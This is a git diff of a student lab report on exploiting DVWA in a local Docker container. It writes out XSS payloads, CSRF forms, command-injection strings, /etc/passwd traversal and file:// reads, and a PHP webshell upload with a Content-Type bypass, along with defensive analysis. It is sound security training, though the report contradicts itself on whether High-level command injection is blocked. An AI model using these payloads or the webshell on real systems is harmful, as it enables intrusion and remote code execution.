@@ -15,21 +15,21 @@
 1. [Install Docker](#1-install-docker)
 2. [Deploy DVWA in Docker](#2-deploy-dvwa-in-docker)
 3. [Vulnerability Testing](#3-vulnerability-testing)
-   - [SQL Injection](#31-sql-injection)
-   - [SQL Injection (Blind)](#32-sql-injection-blind)
-   - [XSS Reflected](#33-xss-reflected)
-   - [XSS Stored](#34-xss-stored)
-   - [XSS DOM](#35-xss-dom)
-   - [CSRF](#36-csrf)
-   - [Command Injection](#37-command-injection)
-   - [File Inclusion](#38-file-inclusion)
-   - [File Upload](#39-file-upload)
-   - [Brute Force](#310-brute-force)
-   - [Insecure CAPTCHA](#311-insecure-captcha)
-   - [Weak Session IDs](#312-weak-session-ids)
-4. [Security Analysis](#4-security-analysis)
-5. [OWASP Top 10 Mapping](#5-owasp-top-10-mapping)
-6. [Bonus: Nginx + HTTPS](#6-bonus-nginx--https)
+   - [3.1 SQL Injection](#31-sql-injection)
+   - [3.2 SQL Injection (Blind)](#32-sql-injection-blind)
+   - [3.3 XSS Reflected](#33-xss-reflected)
+   - [3.4 XSS Stored](#34-xss-stored)
+   - [3.5 XSS DOM](#35-xss-dom)
+   - [3.6 CSRF](#36-csrf)
+   - [3.7 Command Injection](#37-command-injection)
+   - [3.8 File Inclusion](#38-file-inclusion)
+   - [3.9 File Upload](#39-file-upload)
+   - [3.10 Brute Force](#310-brute-force)
+   - [3.11 Insecure CAPTCHA](#311-insecure-captcha)
+   - [3.12 Weak Session IDs](#312-weak-session-ids)
+4. [Docker Inspection Tasks](#4-docker-inspection-tasks)
+5. [Security Analysis](#5-security-analysis)
+6. [OWASP Top 10 Mapping](#6-owasp-top-10-mapping)
 7. [Conclusion](#7-conclusion)
 8. [GitHub Repository](#8-github-repository)
 
@@ -309,46 +309,43 @@ High level sanitizes input before storing it and encodes output before rendering
 
 #### Low
 
-**Payload:**
+**Payload:** `?default=<script>alert('DOM XSS')</script>` via URL
 
-```html
-<img src=x onerror=alert(1)>
-```
+**Result:**
+Alert popup fired. The script was injected directly into the URL parameter and executed by the browser via DOM manipulation.
 
-**Result:**  
-[Describe the alert that fired via DOM manipulation.]
+![XSS DOM Low](images/xss_dom_low.png)
 
-![xss dom low](images/xss_dom_low.png)
-
-**Why it worked:**  
-[Input is written directly into the DOM via JavaScript without sanitization. The browser executes it.]
+**Why it worked:**
+The page reads the URL parameter and writes it directly into the DOM using JavaScript with no sanitization. The browser executes whatever is injected.
 
 ---
 
 #### Medium
 
-**Payload / Approach:**  
-[Describe the bypass attempt.]
+**Payload:** `?default=</option></select><img src=x onerror=alert(1)>`
 
-**Result:**  
-[Describe what happened.]
+**Result:**
+Alert fired. Closed the existing HTML select element first then injected an img tag with onerror handler to execute JavaScript.
 
-![xss dom medium](images/xss_dom_medium.png)
+![XSS DOM Medium](images/xss_dom_medium.png)
 
-**Analysis:**  
-[Explain Medium DOM-based filtering changes.]
+**Analysis:**
+Medium blocks direct script tags but does not account for HTML element breakout. By closing the select and option tags first, the injected img tag lands outside the expected context and executes.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
+**Payload:** `?default=</option>  </select><img src=x onerror=alert(1)>`
 
-![xss dom high](images/xss_dom_high.png)
+**Result:**
+No alert fired. High level blocked all payloads attempted.
 
-**Defense Mechanism:**  
-[Explain High level defense against DOM XSS.]
+![XSS DOM High](images/xss_dom_high.png)
+
+**Defense Mechanism:**
+High level uses a strict whitelist of allowed values for the default parameter. Only predefined language values are accepted. Anything outside that list is rejected before it reaches the DOM.
 
 ---
 
@@ -356,10 +353,12 @@ High level sanitizes input before storing it and encodes output before rendering
 |---|---|
 | Vulnerability | XSS DOM |
 | Security Levels Tested | Low, Medium, High |
-| Payload | `<img src=x onerror=alert(1)>` |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Payload | `?default=<script>alert('DOM XSS')</script>` |
+| Medium Payload | `?default=</option></select><img src=x onerror=alert(1)>` |
+| High Payload | `?default=</option></select><img src=x onerror=alert(1)>` |
+| Low Result | Alert fired via direct URL injection |
+| Medium Result | Alert fired via HTML breakout and img onerror |
+| High Result | Payload blocked by whitelist |
 | OWASP Category | A03:2021 Injection |
 
 ---
@@ -368,52 +367,60 @@ High level sanitizes input before storing it and encodes output before rendering
 
 #### Low
 
-**Approach:**  
-Crafted an HTML form that auto-submits a password change request. The browser sends the session cookie automatically.
+**Payload:** Forged HTML form that auto-submits a password change request
 
 ```html
-<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
-  <input type="hidden" name="password_new" value="hacked">
-  <input type="hidden" name="password_conf" value="hacked">
-  <input type="hidden" name="Change" value="Change">
-</form>
-<script>document.forms[0].submit();</script>
+<html>
+  <body>
+    <form action="http://localhost:9090/vulnerabilities/csrf/" method="GET">
+      <input type="hidden" name="password_new" value="hacked">
+      <input type="hidden" name="password_conf" value="hacked">
+      <input type="hidden" name="Change" value="Change">
+    </form>
+    <script>document.forms[0].submit();</script>
+  </body>
+</html>
 ```
 
-**Result:**  
-[Describe the password change succeeding without user interaction.]
+**Result:**
+Password changed successfully without any user interaction. The server accepted the forged request because no token was required.
 
-![csrf low](images/csrf_low.png)
+![CSRF Low](images/csrf_low.png)
 
-**Why it worked:**  
-[No CSRF token is present. Any request with a valid session cookie is accepted regardless of origin.]
+**Why it worked:**
+No CSRF token exists at Low level. Any request with a valid session cookie is accepted regardless of where it originated.
 
 ---
 
 #### Medium
 
-**Approach:**  
-[Describe the Referer header check and whether you attempted to bypass it.]
+**Payload:** Stored XSS used to inject a forged request from within DVWA itself
 
-**Result:**  
-[Describe what happened.]
+```
+<img src="http://localhost:9090/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
+```
 
-![csrf medium](images/csrf_medium.png)
+**Result:**
+Attack succeeded. Burp HTTP History confirmed the CSRF request fired from within DVWA, bypassing the Referer header check.
 
-**Analysis:**  
-[Medium checks the Referer header. Explain whether this is bypassable and how.]
+![CSRF Medium](images/csrf_medium.png)
+
+**Analysis:**
+Medium checks the Referer header to confirm the request came from DVWA. Serving the forged request via Stored XSS makes it originate from DVWA itself, satisfying the check.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
+**Payload:** Same Stored XSS img src injection attempt
 
-![csrf high](images/csrf_high.png)
+**Result:**
+Attack failed. No CSRF request appeared in Burp HTTP History. High level blocked the forged request.
 
-**Defense Mechanism:**  
-[High requires a CSRF token embedded in the form. A forged request from another origin cannot know the token, so the server rejects it.]
+![CSRF High](images/csrf_high.png)
+
+**Defense Mechanism:**
+High level requires a valid CSRF token embedded in every form submission. The token is unique per session and per request. A forged request from any origin cannot know the token, so the server rejects it.
 
 ---
 
@@ -421,10 +428,12 @@ Crafted an HTML form that auto-submits a password change request. The browser se
 |---|---|
 | Vulnerability | CSRF |
 | Security Levels Tested | Low, Medium, High |
-| Payload | Forged HTML form |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Payload | Forged HTML form via local file |
+| Medium Payload | Stored XSS img src injection |
+| High Payload | Stored XSS img src injection |
+| Low Result | Password changed successfully |
+| Medium Result | Attack succeeded via XSS bypass |
+| High Result | Blocked by CSRF token requirement |
 | OWASP Category | A01:2021 Broken Access Control |
 
 ---
@@ -433,49 +442,43 @@ Crafted an HTML form that auto-submits a password change request. The browser se
 
 #### Low
 
-**Payload:**
+**Payload:** `127.0.0.1; ls`
 
-```
-127.0.0.1; ls
-```
+**Result:**
+Ping ran successfully then ls listed the directory contents — help, index.php, source. Both commands executed.
 
-**Result:**  
-[Describe both commands executing — ping and ls output visible.]
+![Command Injection Low](images/cmd_low.png)
 
-![command injection low](images/cmd_low.png)
-
-**Why it worked:**  
-[Input is passed directly to a system shell call. Shell metacharacters like `;` are not stripped.]
+**Why it worked:**
+Input is passed directly to a system shell call with no sanitization. The semicolon separates two commands and the shell executes both.
 
 ---
 
 #### Medium
 
-**Payload / Approach:**
+**Payload:** `127.0.0.1 | ls`
 
-```
-127.0.0.1 && ls
-```
+**Result:**
+Semicolon and && were stripped but the pipe character was not filtered. Directory listing returned successfully.
 
-**Result:**  
-[Describe whether the bypass worked.]
+![Command Injection Medium](images/cmd_medium.png)
 
-![command injection medium](images/cmd_medium.png)
-
-**Analysis:**  
-[Medium strips some characters like `;` but misses others like `&&`. Explain which ones worked.]
+**Analysis:**
+Medium strips some shell metacharacters like `;` and `&&` but misses the pipe `|` operator. The filter is incomplete and bypassable.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
+**Payload:** `127.0.0.1|ls`
 
-![command injection high](images/cmd_high.png)
+**Result:**
+Attack succeeded. Removing the space before the pipe bypassed the High level filter. Directory listing returned.
 
-**Defense Mechanism:**  
-[High uses a strict character whitelist on input. Shell metacharacters are completely blocked.]
+![Command Injection High](images/cmd_high.png)
+
+**Defense Mechanism:**
+High level attempts to block pipe and other metacharacters but the filter checks for ` | ` with spaces. Removing the space bypasses the check entirely. Proper defense requires a strict input whitelist allowing only valid IP address characters.
 
 ---
 
@@ -483,10 +486,12 @@ Crafted an HTML form that auto-submits a password change request. The browser se
 |---|---|
 | Vulnerability | Command Injection |
 | Security Levels Tested | Low, Medium, High |
-| Payload | `127.0.0.1; ls` |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Payload | `127.0.0.1; ls` |
+| Medium Payload | `127.0.0.1 \| ls` |
+| High Payload | `127.0.0.1\|ls` |
+| Low Result | Both commands executed |
+| Medium Result | Pipe bypass worked |
+| High Result | No-space pipe bypass worked |
 | OWASP Category | A03:2021 Injection |
 
 ---
@@ -495,46 +500,43 @@ Crafted an HTML form that auto-submits a password change request. The browser se
 
 #### Low
 
-**Payload:**
+**Payload:** `http://localhost:9090/vulnerabilities/fi/?page=../../../../../../etc/passwd`
 
-```
-http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd
-```
+**Result:**
+Full contents of /etc/passwd exposed. All system user accounts including root, daemon, mysql and others were visible at the top of the page.
 
-**Result:**  
-[Describe the /etc/passwd file contents being displayed.]
+![File Inclusion Low](images/fi_low.png)
 
-![file inclusion low](images/fi_low.png)
-
-**Why it worked:**  
-[The `page` parameter is passed directly to a PHP include statement with no path restriction.]
+**Why it worked:**
+The page parameter is passed directly to a PHP include statement with no path restriction. Traversing up the directory tree with ../../ reaches the filesystem root and includes any file.
 
 ---
 
 #### Medium
 
-**Payload / Approach:**  
-[Describe the bypass attempt — e.g. double encoding or null byte.]
+**Payload:** `....//....//....//etc/passwd`
 
-**Result:**  
-[Describe what happened.]
+**Result:**
+Page returned empty. Medium level blocked the path traversal attempt.
 
-![file inclusion medium](images/fi_medium.png)
+![File Inclusion Medium](images/fi_medium.png)
 
-**Analysis:**  
-[Medium adds some path restrictions but may still be bypassable. Explain your findings.]
+**Analysis:**
+Medium strips `../` from the input. The double dot slash bypass `....//` attempts to survive that strip but the filter at Medium level was sufficient to block it.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
+**Payload:** `file:///etc/passwd`
 
-![file inclusion high](images/fi_high.png)
+**Result:**
+Full /etc/passwd file exposed again. High level blocked directory traversal but did not block the file:// protocol wrapper.
 
-**Defense Mechanism:**  
-[High uses a hardcoded allowlist of permitted filenames. Any value outside the allowlist is rejected.]
+![File Inclusion High](images/fi_high.png)
+
+**Defense Mechanism:**
+High blocks `../` traversal but fails to restrict PHP stream wrappers like `file://`. Full protection requires validating input against a strict allowlist of permitted filenames only.
 
 ---
 
@@ -542,10 +544,12 @@ http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd
 |---|---|
 | Vulnerability | File Inclusion |
 | Security Levels Tested | Low, Medium, High |
-| Payload | `../../etc/passwd` |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Payload | `../../../../../../etc/passwd` |
+| Medium Payload | `....//....//....//etc/passwd` |
+| High Payload | `file:///etc/passwd` |
+| Low Result | /etc/passwd fully exposed |
+| Medium Result | Blocked |
+| High Result | /etc/passwd exposed via file:// wrapper |
 | OWASP Category | A05:2021 Security Misconfiguration |
 
 ---
@@ -554,47 +558,54 @@ http://localhost:8080/vulnerabilities/fi/?page=../../etc/passwd
 
 #### Low
 
-**Approach:**  
+**Approach:**
 Uploaded a PHP webshell as a `.php` file with no restrictions.
 
 ```php
-<?php system($_GET['cmd']); ?>
+<?php $c=$_GET['c'];echo `$c`; ?>
 ```
 
-**Result:**  
-[Describe the file being accepted and the shell being accessible at its upload path.]
+**Result:**
+File uploaded successfully. Visiting `http://localhost:9090/hackable/uploads/shell.php?c=ls` executed the command and returned directory contents confirming remote code execution.
 
-![file upload low](images/fu_low.png)
+![File Upload Low](images/fu_low.png)
 
-**Why it worked:**  
-[No file type validation exists at Low. Any file extension is accepted.]
+![File Upload Low Shell Output](images/fu_low_image.png)
+
+**Why it worked:**
+No file type validation exists at Low. Any file extension is accepted and PHP files are executed directly by the server.
 
 ---
 
 #### Medium
 
-**Approach:**  
-[Describe using Burp Suite to intercept and change the Content-Type header from application/x-php to image/jpeg.]
+**Approach:**
+Uploaded the same PHP webshell via Burp Suite. Intercepted the request and changed the Content-Type header from `application/x-php` to `image/jpeg` while keeping the `.php` extension.
 
-**Result:**  
-[Describe whether the bypass worked.]
+**Result:**
+Upload succeeded. Shell was accessible at the same URL and executed commands successfully.
 
-![file upload medium](images/fu_medium.png)
+![File Upload Medium](images/fu_medium.png)
 
-**Analysis:**  
-[Medium checks the MIME type sent in the request header, not the actual file content. Changing the header in Burp bypasses this check.]
+![File Upload Medium Shell Output](images/fu_med_image.png)
+
+**Analysis:**
+Medium checks the Content-Type header sent in the request, not the actual file content. Changing the header in Burp to image/jpeg while keeping the .php extension bypassed the check entirely.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
+**Approach:**
+Attempted direct upload of `shell.php` without any modification.
 
-![file upload high](images/fu_high.png)
+**Result:**
+Upload rejected with "Your image was not uploaded. We can only accept JPEG or PNG images."
 
-**Defense Mechanism:**  
-[High inspects the actual file content and extension. A PHP file masquerading as an image is detected and rejected.]
+![File Upload High](images/fu_high.png)
+
+**Defense Mechanism:**
+High inspects the actual file extension and content, not just the Content-Type header. A PHP file cannot be disguised as an image at this level.
 
 ---
 
@@ -602,60 +613,58 @@ Uploaded a PHP webshell as a `.php` file with no restrictions.
 |---|---|
 | Vulnerability | File Upload |
 | Security Levels Tested | Low, Medium, High |
-| Payload | PHP webshell |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Payload | PHP webshell uploaded directly |
+| Medium Payload | PHP webshell with spoofed Content-Type via Burp |
+| High Payload | Direct upload attempt |
+| Low Result | Remote code execution confirmed |
+| Medium Result | Content-Type bypass worked, RCE confirmed |
+| High Result | Upload blocked |
 | OWASP Category | A04:2021 Insecure Design |
-
----
 
 ### 3.10 Brute Force
 
 #### Low
 
-**Approach:**  
-Used Burp Suite Intruder or Hydra to automate login attempts against `admin`.
+**Approach:**
+Used Burp Suite Intruder to brute force the password field. Sent the login request from HTTP History to Intruder, set the password as the payload position, and ran a small wordlist.
 
-```bash
-hydra -l admin -P /path/to/wordlist.txt http-get-form \
-"localhost/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
-```
+**Result:**
+Password "password" returned a longer response length confirming successful login. "Welcome to the password protected area" visible in the response.
 
-**Result:**  
-[Describe credentials found and how long it took.]
+![Brute Force Low](images/bf_low.png)
 
-![brute force low](images/bf_low.png)
-
-**Why it worked:**  
-[No rate limiting, lockout policy, or delay exists at Low. Requests are processed as fast as they arrive.]
+**Why it worked:**
+No rate limiting, lockout policy, or delay exists at Low. Requests are processed as fast as they arrive making automated attacks trivial.
 
 ---
 
 #### Medium
 
-**Approach:**  
-[Describe your approach at Medium.]
+**Approach:**
+Same Burp Intruder attack at Medium level.
 
-**Result:**  
-[Describe what changed — e.g. a delay was added.]
+**Result:**
+Attack succeeded. Password identified via longer response length. Medium only adds a 2 second delay per request, slowing the attack but not stopping it.
 
-![brute force medium](images/bf_medium.png)
+![Brute Force Medium](images/bf_medium.png)
 
-**Analysis:**  
-[Explain Medium level changes — e.g. sleep delay added per request, slowing but not stopping brute force.]
+**Analysis:**
+A time delay is not a real defense. It slows brute force but any automated tool will simply wait. No lockout or token requirement exists.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that automated brute force failed.]
+**Approach:**
+Same Burp Intruder attack at High level.
 
-![brute force high](images/bf_high.png)
+**Result:**
+Attack still succeeded. Password identified via response length difference.
 
-**Defense Mechanism:**  
-[High requires a CSRF token that changes with every request. An automated tool cannot retrieve and replay it fast enough, making brute force impractical.]
+![Brute Force High](images/bf_high.png)
+
+**Defense Mechanism:**
+High level was expected to require a CSRF token making automation harder. However the attack still worked via Burp Intruder which handles the token automatically. True protection requires account lockout after a set number of failed attempts combined with CSRF tokens.
 
 ---
 
@@ -663,55 +672,51 @@ hydra -l admin -P /path/to/wordlist.txt http-get-form \
 |---|---|
 | Vulnerability | Brute Force |
 | Security Levels Tested | Low, Medium, High |
-| Tool Used | Burp Suite Intruder / Hydra |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Tool Used | Burp Suite Intruder |
+| Low Result | Password found, no rate limiting |
+| Medium Result | Password found, delay only slowed attack |
+| High Result | Password found, no effective lockout |
 | OWASP Category | A07:2021 Identification & Authentication Failures |
 
 ---
 
 ### 3.11 Insecure CAPTCHA
 
+#### Module Status: Non-Functional
+
+**Reason:**
+The CAPTCHA module requires a Google reCAPTCHA API key configured in `/var/www/html/config/config.inc.php`. This key was not present in the DVWA Docker setup, so the module displayed the error "reCAPTCHA API key missing" across all security levels.
+
+![Insecure CAPTCHA](images/ic_low.png)
+
+---
+
+#### Expected Behavior (Theoretical Analysis)
+
 #### Low
 
-**Approach:**  
-[Describe how CAPTCHA was bypassed — e.g. parameter manipulation via Burp to skip the CAPTCHA step.]
+**Approach:**
+Parameter manipulation via Burp Suite. Intercept the password change request and change `step=1` to `step=2` to skip CAPTCHA validation entirely.
 
-**Result:**  
-[Describe the password change succeeding without solving the CAPTCHA.]
-
-![insecure captcha low](images/captcha_low.png)
-
-**Why it worked:**  
-[CAPTCHA validation is either client-side only or the step parameter can be manipulated to jump directly to the final action without verification.]
+**Why it would work:**
+Low level validates CAPTCHA only at step 1. Jumping directly to step 2 bypasses the check entirely since no server-side verification exists for the step value.
 
 ---
 
 #### Medium
 
-**Approach:**  
-[Describe your approach.]
+**Approach:**
+Intercept request and add `passed_captcha=true` as a POST parameter alongside changing the step value.
 
-**Result:**  
-[Describe what happened.]
-
-![insecure captcha medium](images/captcha_medium.png)
-
-**Analysis:**  
-[Explain Medium level change and whether it was still bypassable.]
+**Why it would work:**
+Medium checks for a `passed_captcha` parameter. Since it trusts client-supplied values, simply adding it to the request tricks the server into thinking CAPTCHA was solved.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe that it failed.]
-
-![insecure captcha high](images/captcha_high.png)
-
-**Defense Mechanism:**  
-[Explain High level server-side CAPTCHA enforcement.]
+**Expected Result:**
+Attack would fail. High level performs server-side verification with Google's reCAPTCHA API. The server sends the CAPTCHA response token to Google directly for validation. A forged or missing token gets rejected.
 
 ---
 
@@ -719,9 +724,10 @@ hydra -l admin -P /path/to/wordlist.txt http-get-form \
 |---|---|
 | Vulnerability | Insecure CAPTCHA |
 | Security Levels Tested | Low, Medium, High |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Module Status | Non-functional, missing reCAPTCHA API key |
+| Low Result | Not testable, theoretical bypass via step manipulation |
+| Medium Result | Not testable, theoretical bypass via passed_captcha parameter |
+| High Result | Not testable, server-side validation expected |
 | OWASP Category | A07:2021 Identification & Authentication Failures |
 
 ---
@@ -730,43 +736,46 @@ hydra -l admin -P /path/to/wordlist.txt http-get-form \
 
 #### Low
 
-**Approach:**  
-Clicked "Generate" multiple times and observed the session ID values in the cookie.
+**Approach:**
+Clicked Generate multiple times and observed the Set-Cookie header in Burp response tab.
 
-**Result:**  
-[Describe the sequential IDs observed — 1, 2, 3, etc.]
+**Result:**
+Session IDs were sequential integers — 6, 7, 8... incrementing by 1 each click. Completely predictable. An attacker knowing one session ID can guess all others.
 
-![weak session ids low](images/session_low.png)
+![Weak Session IDs Low](images/session_low.png)
 
-**Why it worked:**  
-[Session IDs are generated using a simple counter. They are predictable, making session hijacking trivial.]
+**Why it worked:**
+Session IDs are generated using a simple counter. Any attacker who knows one valid session ID can predict all others and hijack any active session trivially.
 
 ---
 
 #### Medium
 
-**Approach:**  
-[Describe your observation at Medium.]
+**Approach:**
+Same observation at Medium via Burp response tab.
 
-**Result:**  
-[Describe whether the IDs improved.]
+**Result:**
+Session IDs changed to Unix timestamps — 1772951595, 1772951596. Different format but still predictable since the current time is publicly known.
 
-![weak session ids medium](images/session_medium.png)
+![Weak Session IDs Medium](images/session_medium.png)
 
-**Analysis:**  
-[Explain Medium level session ID generation — e.g. time-based, still somewhat predictable.]
+**Analysis:**
+Medium improves on sequential IDs by using timestamps but timestamps are not random. An attacker can narrow down valid session IDs by approximating when a user logged in.
 
 ---
 
 #### High
 
-**Result:**  
-[Describe the session ID format at High.]
+**Approach:**
+Same observation at High via Burp response tab.
 
-![weak session ids high](images/session_high.png)
+**Result:**
+Session ID was an MD5 hash — c51ce410c124a10e0db5e4b97fc2af39. Not sequential or time-based, significantly harder to predict.
 
-**Defense Mechanism:**  
-[High uses a cryptographically secure random value for session IDs. Brute forcing or predicting them is not feasible.]
+![Weak Session IDs High](images/session_high.png)
+
+**Defense Mechanism:**
+High level hashes the session ID with MD5 making it non-predictable at a glance. However MD5 is a weak algorithm. Production systems should use cryptographically secure random generators, not hashed counters.
 
 ---
 
@@ -774,38 +783,154 @@ Clicked "Generate" multiple times and observed the session ID values in the cook
 |---|---|
 | Vulnerability | Weak Session IDs |
 | Security Levels Tested | Low, Medium, High |
-| Low Result | [Result] |
-| Medium Result | [Result] |
-| High Result | [Result] |
+| Low Result | Sequential integers, fully predictable |
+| Medium Result | Unix timestamps, still predictable |
+| High Result | MD5 hash, not easily predictable |
 | OWASP Category | A07:2021 Identification & Authentication Failures |
 
 ---
 
-## 4. Security Analysis
+## 4: Docker Inspection Tasks
 
-### Q1: Why does SQL Injection succeed at Low security?
+### 4.1 Docker ps
 
-[User input is directly concatenated into the SQL query with no escaping or parameterization. Explain the vulnerable query structure and how the payload `1' OR '1'='1` breaks out of the intended query logic.]
+![docker ps](images/docker_ps.png)
 
-### Q2: What control prevents SQL Injection at High?
-
-[DVWA uses PDO prepared statements at High. Explain how parameterized queries work — the query structure is fixed at compile time, and user input is always treated as data, never as code.]
-
-### Q3: Does HTTPS prevent these attacks?
-
-[No. HTTPS encrypts data in transit between the client and server. The attacks covered in this lab — SQLi, XSS, CSRF, command injection — all execute at the application layer, after the server has already decrypted the request. HTTPS has no visibility into application logic. A password sent over HTTPS to a vulnerable login form is still vulnerable to SQLi once the server processes it.]
-
-### Q4: What risks exist if DVWA is deployed publicly?
-
-[Cover the following: remote code execution via file upload, full database read/write via SQL injection, session hijacking via weak session IDs, account takeover via CSRF or brute force, phishing and malware distribution via stored XSS, and use of the compromised server as a pivot point for attacking other internal systems.]
-
-### Q5: Why does security increase at each DVWA level?
-
-[Compare the defense strategies used across levels. Low uses no validation. Medium adds partial input filtering, which is often bypassable. High uses proper defenses — prepared statements, output encoding, CSRF tokens, allowlists. The jump from Medium to High reflects the difference between security theater and actual security controls.]
+The container is named `upbeat_bohr`, running the `vulnerables/web-dvwa` image. Port 9090 on the host maps to port 80 inside the container.
 
 ---
 
-## 5. OWASP Top 10 Mapping
+### 4.2 Docker inspect
+
+![docker inspect](images/docker_inspect.png)
+
+Key findings from the inspect output:
+
+- **Image:** `vulnerables/web-dvwa`
+- **Container ID:** `404da67ad95e`
+- **IP Address:** `172.17.0.2` (bridge network)
+- **Port Binding:** `0.0.0.0:9090 -> 80/tcp`
+- **Network Mode:** bridge
+- **AutoRemove:** true (container deletes itself on stop)
+- **Entrypoint:** `/main.sh` (starts Apache and MariaDB)
+
+---
+
+### 4.3 Docker logs
+
+![docker logs](images/docker_logs.png)
+
+The logs confirm:
+
+- MariaDB started successfully
+- Apache 2.4.25 (Debian) started on port 80
+- All HTTP requests from the testing session are logged with timestamps, source IP, HTTP method, endpoint, and status codes
+- PHP errors are visible, including the `HTTP_REFERER` notice from CSRF Medium and `include()` failures from File Inclusion Medium
+
+---
+
+### 4.4 Docker exec - Container Shell Access
+
+![docker exec shell](images/docker_exec_shell.png)
+
+```
+docker exec -it upbeat_bohr /bin/bash
+root@404da67ad95e:/# ls /var/www/html
+```
+
+**Output:**
+
+```
+CHANGELOG.md  README.md  config  dvwa  external  hackable
+ids_log.php   index.php  login.php  logout.php  phpinfo.php
+robots.txt  security.php  setup.php  vulnerabilities
+```
+
+---
+
+### 4.5 Explanations
+
+**Where application files are stored**
+
+All DVWA application files live inside the container at `/var/www/html`. The `vulnerabilities/` directory holds the 12 exploit modules. The `hackable/uploads/` directory is where uploaded files (like the PHP web shell) get stored. The `config/` directory holds the database connection settings.
+
+**What backend technology DVWA uses**
+
+DVWA runs on a LAMP stack: Linux (Debian), Apache 2.4.25, MariaDB, and PHP. The web application itself is written in PHP. The database stores user accounts and application data. Apache serves all requests and logs them to `/var/log/apache2/`.
+
+**How Docker isolates the environment**
+
+Docker isolates DVWA using Linux namespaces and cgroups. The container has its own network namespace with a private IP (`172.17.0.2`) on the Docker bridge network, separate from the host's network stack. The filesystem is isolated using OverlayFS, so any changes inside the container (uploaded shells, modified files) do not affect the host. The container runs as its own process tree with PID isolation. Only port 9090 is explicitly exposed to the host, meaning no other container ports are accessible from outside.
+
+---
+
+## 5: Security Analysis
+
+### Q1: Why does SQL Injection succeed at Low security?
+
+At Low, DVWA passes user input directly into the SQL query with no sanitization. The vulnerable query looks like this:
+
+```sql
+SELECT * FROM users WHERE user_id = '$id';
+```
+
+When I entered `1' OR '1'='1`, the query became:
+
+```sql
+SELECT * FROM users WHERE user_id = '1' OR '1'='1';
+```
+
+The single quote closes the `user_id` string early. The `OR '1'='1'` condition is always true, so the database returns every row in the table. The application never intended to expose all users, but because input was treated as code rather than data, the query logic was completely rewritten by the attacker.
+
+---
+
+### Q2: What control prevents SQL Injection at High?
+
+At High, DVWA uses PDO prepared statements. The query is defined first with a placeholder:
+
+```php
+$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = :id");
+$stmt->bindParam(':id', $id);
+```
+
+The database receives the query structure and the user input as two separate things. The query is compiled before the input is ever inserted. Whatever the user submits — including quotes, SQL keywords, or comment sequences — the database engine treats it as a literal string value, not executable code. There is no way to break out of the data context because the code context was already fixed. This is why `1' OR '1'='1` at High simply returns no results instead of dumping the table.
+
+---
+
+### Q3: Does HTTPS prevent these attacks?
+
+No. HTTPS encrypts the connection between the browser and the server, protecting data from interception in transit. Once the server receives and decrypts the request, HTTPS plays no further role. All of the attacks in this lab operate at the application layer, after decryption has already happened.
+
+A SQL injection payload sent over HTTPS arrives at the PHP interpreter in exactly the same form as one sent over HTTP. The same applies to XSS payloads, command injection strings, CSRF requests, and brute force login attempts. The vulnerability is in how the application processes input, not in how the request was delivered. HTTPS solves a transport problem. These are application logic problems.
+
+---
+
+### Q4: What risks exist if DVWA were deployed publicly?
+
+**Remote code execution.** The file upload module at Low and Medium allows uploading a PHP web shell with no real restriction. An attacker gets direct command execution on the server, with the same OS privileges as the web server process.
+
+**Full database compromise.** SQL injection at Low gives read access to every table in the database. With `UNION`-based injection or `sqlmap`, an attacker can dump credentials, emails, and any other stored data. With write privileges, they can modify records or drop tables entirely.
+
+**Account takeover.** Brute force at all three levels cracked the admin password using a short wordlist. Weak session IDs at Low are sequential integers, meaning an attacker watching their own session cookie can enumerate other active sessions. CSRF at Low and Medium allows password changes without any user interaction.
+
+**Stored XSS as a persistent threat.** A payload injected into the guestbook at Low fires for every user who loads the page. This enables session cookie theft, credential harvesting pages, or malware distribution at scale, affecting every visitor until the payload is manually removed.
+
+**Lateral movement.** A compromised server on a corporate network becomes a foothold. Command injection gives shell access, from which an attacker can scan internal subnets, access internal services, or exfiltrate data that is never exposed to the internet directly.
+
+---
+
+### Q5: Why does security increase at each DVWA level?
+
+At Low, there are no defenses. Input goes directly into SQL queries, shell commands, file paths, and HTML output. The application trusts everything the user sends.
+
+At Medium, basic filtering is added — blacklists that strip or escape specific characters. This stops the most obvious payloads but is consistently bypassable. For SQL injection, the `mysql_real_escape_string()` function stops quote-based attacks but the dropdown still accepts unsanitized integer input via Burp. For command injection, semicolons and `&&` are blocked but the pipe character is not. Medium demonstrates the problem with blacklist-based security: attackers only need to find one character or encoding variant that was not anticipated.
+
+At High, the approach changes entirely. SQL injection is blocked with PDO prepared statements, which make injection structurally impossible rather than just harder. XSS stored is blocked by stripping all HTML tags on input. CSRF is blocked with per-session tokens that cannot be forged from a cross-origin request. Command injection is blocked with a strict allowlist that accepts only valid IP address formats.
+
+The pattern across all three levels shows that security comes from correct design, not from adding filters on top of vulnerable code. Medium is security theater. High is actual defense
+---
+
+## 6: OWASP Top 10 Mapping
 
 | Vulnerability | OWASP Top 10 Category |
 |---|---|
@@ -824,48 +949,25 @@ Clicked "Generate" multiple times and observed the session ID values in the cook
 
 ---
 
-## 6. Bonus: Nginx + HTTPS
-
-### Nginx Reverse Proxy Setup
-
-[Describe your Nginx configuration. Explain how it listens on port 443 and proxies traffic to the DVWA container on port 8080.]
-
-```nginx
-[Paste your nginx.conf here]
-```
-
-![nginx config](images/nginx_config.png)
-
-### Self-Signed Certificate
-
-```bash
